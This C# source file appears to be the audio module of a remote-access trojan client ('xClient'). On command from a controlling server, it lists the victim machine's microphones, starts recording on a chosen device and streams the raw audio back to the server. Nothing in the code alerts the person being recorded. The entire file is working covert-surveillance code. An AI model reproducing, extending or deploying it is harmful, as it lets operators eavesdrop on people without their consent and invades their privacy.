using System;
using System.Collections.Generic;
using System.Diagnostics;
using xClient.Core.NAudio.Wave;
using xClient.Core.NAudio.Wave.WaveFormats;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;

namespace xClient.Core.Commands {

    public static partial class CommandHandler {

        private static WaveInEvent _waveInEvent { get; set; }
        public static bool StreamRunning { get; set; }


        public static void HandleGetAudioDevices(Packets.ServerPackets.GetAudioDevices command, Client client) {

            try {
                var deviceDictionary = new Dictionary<string, int>();
                var waveInDevices = WaveIn.DeviceCount;
                for (var waveInDevice = 0; waveInDevice < waveInDevices; waveInDevice++) {
                    var deviceInfo = WaveIn.GetCapabilities(waveInDevice);
                    deviceDictionary.Add(deviceInfo.ProductName, deviceInfo.Channels);
                }

                if (deviceDictionary.Count > 0) {
                    new GetAudioDevicesResponse(deviceDictionary).Execute(client);
                }
            }
            catch (Exception ex) {
                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
            }
        }


        public static void HandleGetAudioStream(Packets.ServerPackets.GetAudioStream command, Client client) {

            try {
                var waveFormat = new WaveFormat(command.SampleRate, command.Channels);
                _waveInEvent = new WaveInEvent {
                    BufferMilliseconds = 50,
                    DeviceNumber = command.Device,
                    WaveFormat = waveFormat
                };
                _waveInEvent.StartRecording();
                _waveInEvent.DataAvailable += (sender, args) => {
                    new GetAudioStreamResponse(args.Buffer).Execute(client);
                };
            }
            catch (Exception ex) {
                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
            }
        }

        public static void HandleStopAudioStream(Packets.ServerPackets.StopAudioStream command, Client client) {

            try {
                _waveInEvent.StopRecording();
                _waveInEvent.Dispose();
                StreamRunning = false;
                new StopAudioStreamResponse(StreamRunning).Execute(client);
            }
            catch(Exception ex) {
                Debug.WriteLine($@"{ex.Message}\n{ex.StackTrace}\n{ex.Source}");
            }
        }
    }
}
